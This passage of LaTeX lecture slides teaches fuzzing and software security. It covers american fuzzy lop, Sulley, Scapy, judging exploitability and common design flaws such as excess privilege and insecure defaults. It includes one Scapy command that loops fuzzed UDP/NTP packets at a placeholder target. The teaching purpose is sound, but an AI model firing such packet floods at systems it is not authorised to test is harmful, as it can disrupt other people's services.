\url{https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0758}
\item Linux kernel have about 5 ASN.1 parsers\\
\url{https://www.x41-dsec.de/de/lab/blog/kernel_userspace/}
\end{list2}

We will go through this article




\slide{Example fuzzers}

\begin{quote}
american fuzzy lop is a free software fuzzer that employs genetic algorithms in order to efficiently increase code coverage of the test cases. So far it helped in detection of significant software bugs in dozens of major free software projects, including X.Org Server,[2] PHP,[3] OpenSSL,[4][5] pngcrush, bash,[6] Firefox,[7] BIND,[8][9] Qt,[10] and SQLite.[11]

american fuzzy lop's source code is published on GitHub. Its name is a reference to a breed of rabbit, the American Fuzzy Lop.
\end{quote}

\begin{list2}
\item Several books and web sites are dedicated to fuzzing, one such:\\ \url{http://www.fuzzing.org/}
\item \url{https://en.wikipedia.org/wiki/American_fuzzy_lop_(fuzzer)}
\item Another one is Sulley, A pure-python fully automated and unattended fuzzing framework.\\
\url{https://github.com/OpenRCE/sulley}
\item Scapy Packet crafting for Python2 and Python3
\url{https://scapy.net/}
\end{list2}


\slide{Scapy Fuzzing}

\begin{quote}{\bf
Fuzzing}

The function fuzz() is able to change any default value that is not to be calculated (like checksums) by an object whose value is random and whose type is adapted to the field. This enables quickly building fuzzing templates and sending them in a loop. In the following example, the IP layer is normal, and the UDP and NTP layers are fuzzed. The UDP checksum will be correct, the UDP destination port will be overloaded by NTP to be 123 and the NTP version will be forced to be 4. All the other ports will be randomized. Note: If you use fuzz() in IP layer, src and dst parameter won’t be random so in order to do that use RandIP().:
\end{quote}

\begin{minted}[fontsize=\small]{python}
>>> send(IP(dst="target")/fuzz(UDP()/NTP(version=4)),loop=1)
................^C
Sent 16 packets.
\end{minted}

\slide{Determining Exploitability}

\begin{list2}
\item AoST chapter 12: Determining Exploitability
\item We have found input that crashes an application, is it exploitable?
\item Is the application privileged, is the function part of a library used in a privileged application?
\item Time, Reliability/Reproduccibility, command execution, network access, knowledge
\item Not all vulnerabilities are remote root arbitrary command execution, often a string of vulnerabilities are put together
\item Architecture, dynamic environment, hardware
\end{list2}

\slide{Weak Structural Security}

Our book describes more design flaws:
\begin{list2}
\item Large Attack surface
\item Running a Process at Too High a Privilege Level, dont run everything as root or administrator
\item No Defense in Depth, use more controls, make a strong chain
\item Not Failing Securely
\item Mixing Code and Data
\item Misplaced trust in External Systems
\item Insecure Defaults
\item Missing Audit Logs
\end{list2}

Repeated here from initial overview - large surface increases risk!



\slidenext{}

\end{document}
